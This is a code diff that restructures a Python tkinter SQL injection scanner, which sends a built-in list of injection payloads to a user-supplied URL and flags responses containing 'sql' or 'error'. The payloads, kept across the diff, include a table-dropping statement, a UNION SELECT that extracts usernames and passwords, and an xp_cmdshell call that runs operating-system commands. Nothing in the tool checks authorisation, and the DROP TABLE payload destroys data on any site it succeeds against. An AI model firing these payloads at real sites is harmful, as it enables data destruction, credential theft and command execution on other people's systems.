@@ -1,44 +1,17 @@
-import tkinter as tk
-from tkinter import messagebox, scrolledtext, ttk
 import requests
-import threading
+import tkinter as tk
+from tkinter import scrolledtext, messagebox
 import re
 
-class SQLiScannerApp:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("SQL Injection Vulnerability Scanner")
-        
-        # Create a frame for the URL input
-        self.url_frame = tk.Frame(root)
-        self.url_frame.pack(side=tk.TOP, fill=tk.X, padx=10, pady=10)
-        
-        # URL input
-        self.url_label = tk.Label(self.url_frame, text="Enter URL:")
-        self.url_label.pack(side=tk.LEFT, padx=5)
-        self.url_entry = tk.Entry(self.url_frame, width=50)
-        self.url_entry.pack(side=tk.LEFT, padx=5)
-        
-        # Scan button
-        self.scan_button = tk.Button(self.url_frame, text="Scan for SQLi", command=self.start_scan)
-        self.scan_button.pack(side=tk.LEFT, padx=5)
-        
-        # Progress bar
-        self.progress = ttk.Progressbar(root, orient="horizontal", length=300, mode="indeterminate")
-        self.progress.pack(pady=10)
-        
-        # Results display
-        self.results_text = scrolledtext.ScrolledText(root, width=60, height=20)
-        self.results_text.pack(pady=5, fill=tk.BOTH, expand=True)
-
-        # Expanded list of predefined SQL injection payloads
+class SQLiScanner:
+    def __init__(self, result_area):
+        self.result_area = result_area  # Store the result_area reference
         self.payloads = [
-            "' OR '1'='1",
             "' OR '1'='1' --",
             "' OR '1'='1' /*",
+            "' OR '1'='1' #",
             "' UNION SELECT NULL, username, password FROM users --",
             "' UNION SELECT NULL, database() --",
-            "' AND 1=2 UNION SELECT NULL, NULL, NULL --",
             "'; DROP TABLE users; --",
             "'; SELECT * FROM information_schema.tables; --",
             "'; EXEC xp_cmdshell('net user'); --",
@@ -68,52 +41,64 @@ class SQLiScannerApp:
             r'(?:/?|[/?]\S+)$', re.IGNORECASE)
         return re.match(regex, url) is not None
 
-    def start_scan(self):
-        url = self.url_entry.get()
-        if not url or not self.is_valid_url(url):
-            messagebox.showwarning("Input Error", "Please enter a valid URL.")
+    def start_scan(self, url):
+        if not self.is_valid_url(url):
+            messagebox.showerror("Error", "Please enter a valid URL.")
             return
         
-        # Start the scanning in a separate thread
-        self.results_text.delete(1.0, tk.END)  # Clear previous results
-        self.results_text.insert(tk.END, f"Starting scan for {url}...\n")
-        self.progress.start()
-        threading.Thread(target=self.scan, args=(url,)).start()
+        results = self.scan(url)
+        self.display_results(results)
 
     def scan(self, url):
-        try:
-            vulnerable_payloads = []
-            for payload in self.payloads:
-                if self.check_vulnerability(url, payload):
-                    vulnerable_payloads.append(payload)
-
-            self.progress.stop()  # Stop the progress bar
-            
-            # Display results
-            if vulnerable_payloads:
-                self.results_text.insert(tk.END, "Vulnerable payloads found:\n")
-                for payload in vulnerable_payloads:
-                    self.results_text.insert(tk.END, f"{payload}\n")
-            else:
-                self.results_text.insert(tk.END, "No vulnerabilities detected.\n")
-        
-        except Exception as e:
-            self.results_text.insert(tk.END, f"Error: {str(e)}\n")
-            self.progress.stop()
+        vulnerable_payloads = []
+        for payload in self.payloads:
+            if self.check_vulnerability(url, payload):
+                vulnerable_payloads.append(payload)
+        return vulnerable_payloads
 
     def check_vulnerability(self, url, payload):
-        # Construct the test URL with the payload
         test_url = f"{url}?id={payload}"  # Assuming the parameter is 'id'
         try:
             response = requests.get(test_url)
-            # Check for common indicators of SQL injection vulnerability
             if "error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
                 return True
             return False
         except requests.exceptions.RequestException:
             return False
 
+    def display_results(self, results):
+        if results:
+            result_text = "Vulnerable payloads found:\n" + "\n".join(results)
+        else:
+            result_text = "No vulnerabilities detected."
+        self.result_area.delete(1.0, tk.END)
+        self.result_area.insert(tk.END, result_text)
+
+class App:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("SQL Injection Scanner")
+
+        self.label = tk.Label(root, text="Enter Target URL:")
+        self.label.pack(pady=5)
+
+        self.url_entry = tk.Entry(root, width=50)
+        self.url_entry.pack(pady=5)
+
+        self.scan_button = tk.Button(root, text="Scan", command=self.scan_url)
+        self.scan_button.pack(pady=5)
+
+        self.result_area = scrolledtext.ScrolledText(root, width=60, height=20)
+        self.result_area.pack(pady=5)
+
+        # Initialize the SQLiScanner with the result_area
+        self.scanner = SQLiScanner(self.result_area)
+
+    def scan_url(self):
+        url = self.url_entry.get()
+        self.scanner.start_scan(url)
+
 if __name__ == "__main__":
     root = tk.Tk()
-    app = SQLiScannerApp(root)
+    app = App(root)
     root.mainloop()
